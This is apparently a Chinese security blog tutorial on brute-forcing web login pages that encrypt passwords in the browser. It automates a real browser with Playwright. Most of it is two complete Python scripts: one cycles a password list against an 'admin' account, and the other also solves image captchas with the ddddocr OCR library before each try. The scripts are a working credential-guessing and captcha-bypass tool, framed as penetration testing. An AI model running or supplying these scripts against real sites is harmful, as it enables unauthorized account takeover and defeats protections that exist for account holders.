​
做渗透测试的时候经常会遇到登录界面对密码进行前端加密的方式，被加密后的密码我们无法直接使用爆破工具对账号密码进行暴力破解登录，一般来说这种情况有两种解决办法，一是在js文件中找到对应的加密算法，对加密数据进行逆向操作，对发包工具中的明文密码进行加密，从而进行暴力破解，二是我们使用python脚本进行自动化处理从而模拟浏览器的正常请求，进行暴力破解，今天演示第二种方法，如何使用playwright模块编写python脚本绕过前端加密进行爆破操作。

​ 这里我编写了两个版本，分别是无验证码版本与有验证码版本，用来应对两种不同环境。

​ playwrite支持录制脚本功能，当我们不知如何使用函数来进行模拟操作时，我们使用下面这条命令来对我们手动操作进行录制。

    
    
    playwright.exe codegen -o test2.py --target python  http://www.xxxx.com
    

​
这条命令会调用playwright的默认浏览器打开我们命令中指定网站并弹出代码框，当我们点击浏览器时，代码框会记录下我们进行的操作，并以代码的形式呈现。这样在我们编写脚本时便可以清楚的知道，我们要进行的操作对应的是哪段函数。

![image-20230821184003077](https://image.3001.net/images/20230821/1692618054_64e34d464b86201e9a353.png!small)

在有验证码版本中，使用了ddddocr这个库，这个库在会调用高版本的pillow时报错，我们可以使用两种方法解决这个问题。

方案一，修改ddddocr的_init_.py文件，将其中的ANTIALIAS替换为新方法：

    
    
    # image = image.resize((int(image.size[0] * (64 / image.size[1])), 64), Image.ANTIALIAS).convert('L')
    image = image.resize((int(image.size[0] * (64 / image.size[1])), 64), Image.LANCZOS).convert('L')
    

方案二，降级Pillow的版本，比如使用9.5.0版本

先卸载，再重新安装

    
    
    pip uninstall -y Pillow
    pip install Pillow==9.5.0
    

两种方案都亲测可用。

    
    
    #无验证码版本
    from playwright.sync_api import sync_playwright
    import time
    if __name__ == '__main__':
        url = 'https://xxxxx.com'
        usr= "admin"
        pwd_list = open("password.txt","r")
        response_url = 'https://xxxxxxx.com'
        with sync_playwright() as p:
            with p.chromium.launch(headless=False) as browser:
                with browser.new_context(locale="zh-CN") as context:
                    page = context.new_page()
                    page.goto(url)
                    time.sleep(10)
                    for pwd in pwd_list:
                        def on_response(response):
                            response.finished()
                            if response.url == response_url and response.request.method == 'POST':
                                failure_keyword = "用户不存在/密码错误"
                                if failure_keyword not in response.text():
                                    print(f'爆破成功，账户名为{usr},密码为{pwd}')
                        page.on('response',on_response)
                        time.sleep(1)
                        page.get_by_placeholder("账号").fill(usr)
                        page.get_by_placeholder("密码").fill(pwd)
                        page.once("dialog",lambda dialog:dialog.dismiss())
                        page.get_by_role('button',name='登 录').click()
                        page.wait_for_load_state()
        pwd_list.close()                
    

​

    
    
    #有验证码版本
    from playwright.sync_api import sync_playwright
    import time
    import ddddocr
    import datetime
    if __name__ == '__main__':
        ocr = ddddocr.DdddOcr(show_ad=False)
        url = 'http://xxxxxxx.com'
        usr= "22064229"
        pwd_list = open("password.txt","r")
        response_url = 'http://xxxxxxxx'
        with sync_playwright() as p:
            with p.chromium.launch(headless=False) as browser:
                with browser.new_context(locale="zh-CN") as context:
                    page = context.new_page()
                    page.goto(url)
                    time.sleep(10)
                    for pwd in pwd_list:
                        time.sleep(5)
                        page.get_by_placeholder("用户名").fill(usr)
                        page.get_by_placeholder("密码").fill(pwd)
                        filename = 'code_img/' + datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S-%f') + '.png'   #存放截图下的验证码用于识别
                        page.get_by_role("img", name="验证码").screenshot(path=filename)
                        with open(filename,'rb') as f :
                            image = f.read()
                        code = ocr.classification(image)
                        page.get_by_role("textbox", name="验证码").fill(code)
                        page.once("dialog",lambda dialog:dialog.dismiss())
                        page.get_by_role("button",name="登录").click()
                        page.wait_for_load_state()
                        if "统一身份认证" not in page.title():
                            print(f'爆破成功，账户名为{usr},密码为{pwd}')
                                    
    

参考连接 ：[青藤云安全-【漫谈攻防】暴力破解进化史
(qingteng.cn)](https://www.qingteng.cn/news/63abe9ed4ebc940032ce00e3.html)

[AttributeError: module ‘PIL.Image‘ has no attribute ‘ANTIALIAS‘_软件测试大叔的博客-CSDN博客](https://blog.csdn.net/light2081/article/details/131517132)

